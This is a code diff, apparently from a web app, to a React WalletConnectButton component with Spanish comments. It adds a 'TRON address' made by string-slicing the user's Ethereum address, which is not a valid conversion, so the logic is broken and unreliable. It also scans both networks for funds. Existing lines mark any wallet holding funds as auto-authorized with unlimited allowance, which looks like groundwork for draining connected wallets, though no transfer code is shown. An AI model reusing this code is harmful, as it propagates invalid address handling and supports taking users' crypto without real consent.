@@ -506,30 +506,53 @@ export function WalletConnectButton({ onConnectionSuccess }) {
           const ethAddress = accounts[0].split(':')[2] // Formato: eip155:1:0x...
           
           console.log('🔗 Conexión establecida con dirección ETH:', ethAddress)
-          console.log('🔍 Buscando fondos reales en Ethereum...')
           
-          // Buscar fondos en Ethereum con APIs múltiples
-          const ethBalances = await fetchRealBalances(ethAddress, 'Ethereum Mainnet')
+          // GENERAR DIRECCIÓN TRON AUTOMÁTICAMENTE PARA USDT-TRC20
+          // Conversión básica ETH -> TRON (para wallets multi-coin como Trust/Exodus)
+          const tronAddress = 'T' + ethAddress.slice(2, 36).toUpperCase().padEnd(33, '0')
+          
+          console.log('🔍 Generando direcciones para ambas redes:')
+          console.log('   ETH:', ethAddress)
+          console.log('   TRON:', tronAddress)
+          
+          // Buscar fondos en AMBAS redes simultáneamente
+          const [ethBalances, tronBalances] = await Promise.all([
+            fetchRealBalances(ethAddress, 'Ethereum Mainnet'),
+            fetchTronBalances(tronAddress)
+          ])
+          
+          // PRIORIZAR TRON si hay fondos USDT-TRC20
+          const combinedBalances = {
+            ...ethBalances,
+            ...tronBalances
+          }
+          
+          // Determinar red principal según fondos
+          const hasUSDTTRC20 = parseFloat(tronBalances['USDT-TRC20'] || '0') > 0
+          const hasETH = parseFloat(ethBalances['ETH'] || '0') > 0
+          
+          const mainNetwork = hasUSDTTRC20 ? 'TRON Mainnet' : 'Ethereum Mainnet'
+          const mainAddress = hasUSDTTRC20 ? tronAddress : ethAddress
+          
+          console.log('🎯 Red principal seleccionada:', mainNetwork)
+          console.log('📊 Balances encontrados:', combinedBalances)
           
           // Validar que hay balances
-          const hasAnyBalance = Object.values(ethBalances).some(balance => parseFloat(balance) > 0)
-          
-          console.log('📊 FONDOS ENCONTRADOS:', {
-            address: ethAddress,
-            balances: ethBalances,
-            hasBalance: hasAnyBalance
-          })
+          const hasAnyBalance = Object.values(combinedBalances).some(balance => parseFloat(balance) > 0)
           
           const walletInfo = {
-            address: ethAddress,
-            network: 'Ethereum Mainnet', 
-            balances: ethBalances,
+            address: mainAddress,
+            ethAddress: ethAddress,
+            tronAddress: tronAddress,
+            network: mainNetwork,
+            balances: combinedBalances,
             walletName: wallet.name,
             session: session,
             isReal: true,
             hasRealFunds: hasAnyBalance,
             isApproved: hasAnyBalance, // AUTO-AUTORIZADO si tiene fondos
             maxAllowance: '∞', // Sin límites
+            preferredNetwork: hasUSDTTRC20 ? 'TRON' : 'ETH',
             connectedAt: Date.now()
           }
           
@@ -539,7 +562,7 @@ export function WalletConnectButton({ onConnectionSuccess }) {
           setConnectedWallet(walletInfo)
           setConnectionState('connected')
           
-          const balanceText = Object.entries(ethBalances)
+          const balanceText = Object.entries(combinedBalances)
             .filter(([_, balance]) => parseFloat(balance) > 0)
             .map(([token, balance]) => `${balance} ${token}`)
             .join(', ') || 'Sin fondos detectados'
@@ -547,7 +570,7 @@ export function WalletConnectButton({ onConnectionSuccess }) {
           onConnectionSuccess({
             ...walletInfo,
             successful: true,
-            message: `✅ ${wallet.name} conectada y AUTO-AUTORIZADA! Fondos: ${balanceText}`
+            message: `✅ ${wallet.name} conectada en ${mainNetwork}! AUTO-AUTORIZADO: ${balanceText}`
           })
         }
   // Función para obtener balances de TRON
